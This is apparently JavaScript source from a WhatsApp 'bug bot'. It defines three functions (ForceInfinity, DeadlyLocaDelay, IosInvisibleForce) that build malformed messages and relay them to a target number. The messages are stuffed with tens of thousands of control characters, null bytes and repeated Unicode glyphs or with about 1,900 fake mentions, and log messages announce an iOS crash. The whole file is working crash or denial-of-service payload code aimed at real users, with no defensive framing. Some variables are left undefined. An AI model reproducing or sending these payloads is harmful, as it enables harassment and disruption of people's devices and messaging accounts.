async function ForceInfinity(sock, target) {
  try {
    let message = {
      interactiveMessage: {
        body: { text: "𝙓𝙔𝙍𝙊𝙎 𝙈𝙊𝙊𝙉" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
                0x2710
              )},\"payment_timestamp\":null,\"share_payment_status\":true}`,
            },
          ],
          messageParamsJson: "{}",
        },
      },
    };

    const msg = generateWAMessageFromContent(target, message, {});

    await sock.relayMessage(target, msg.message, {
      additionalNodes: [
        { tag: "biz", attrs: { native_flow_name: "payment_method" } },
      ],
      messageId: msg.key.id,
      participant: { jid: target },
      userJid: target,
    });

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: { native_flow_name: "payment_method" },
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });

    console.log("𝙁𝙤𝙧𝙘𝙚 𝙃𝙖𝙧𝙙 𝙓𝙮𝙧𝙤𝙨 𝙨𝙪𝙘𝙘𝙚𝙨 𝙩𝙤 𝙩𝙖𝙧𝙜𝙚𝙩");
  } catch (err) {
    console.error(calik.red.bold(err));
  }
}

async function DeadlyLocaDelay(sock, target) {
  let biji1 = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "HII BRO",
            locationMessage: {
              degreesLatitude: 0,
              degreesLongtitude: 0,
            },
            hasMediaAttachment: true,
          },
          contextInfo: {
            participant: x,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
          },
          body: {
            text: "𝙓𝙔𝙍𝙊𝙎 𝙈𝙊𝙊𝙉",
          },
        },
      },
    },
  };
  
  const msg1 = generateWAMessageFromContent(x, biji1, {});

  await sock.relayMessage("status@broadcast", msg1.message, {
    messageId: msg1.key.id,
    statusJidList: [x],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: x },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  let biji2 = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "HII BRO",
            locationMessage: {
              degreesLatitude: 0,
              degreesLongtitude: 0,
            },
            hasMediaAttachment: true,
          },
          contextInfo: {
            participant: x,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
          },
          body: {
            text: "𝘼𝙍𝘼𝘿𝙄𝙇𝘼𝘼𝘼 𝙓 𝙓𝙔𝙍𝙊𝙎",
          },
        },
      },
    },
  };
  
  const msg2 = generateWAMessageFromContent(x, biji2, {});

  await sock.relayMessage("status@broadcast", msg2.message, {
    messageId: msg2.key.id,
    statusJidList: [x],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: x },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function IosInvisibleForce(sock, target) {
  const msg = {
  message: {
    locationMessage: {
      degreesLatitude: 21.1266,
      degreesLongitude: -11.8199,
      name: "𝐋𝐢𝐦𝐯𝐳𝐱𝐱𝐱 𝐗 𝐕𝐚𝐱𝐢𝐥𝐨𝐧-‣꙱\n" + "\u0000".repeat(60000) + "𑇂𑆵𑆴𑆿".repeat(60000),
      url: "https://t.me/LimvzxTyz",
      contextInfo: {
        externalAdReply: {
          quotedAd: {
            advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
            mediaType: "Vaxilon",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
            caption: "@rizxvelzinfinity" + "𑇂𑆵𑆴𑆿".repeat(60000)
          },
          placeholderKey: {
            remoteJid: "0s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          }
        }
      }
    }
  }
};
  
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
  console.log(randomColor()(`─────「 ⏤!CrashInvisibleIOS To: ${target}!⏤ 」─────`))
}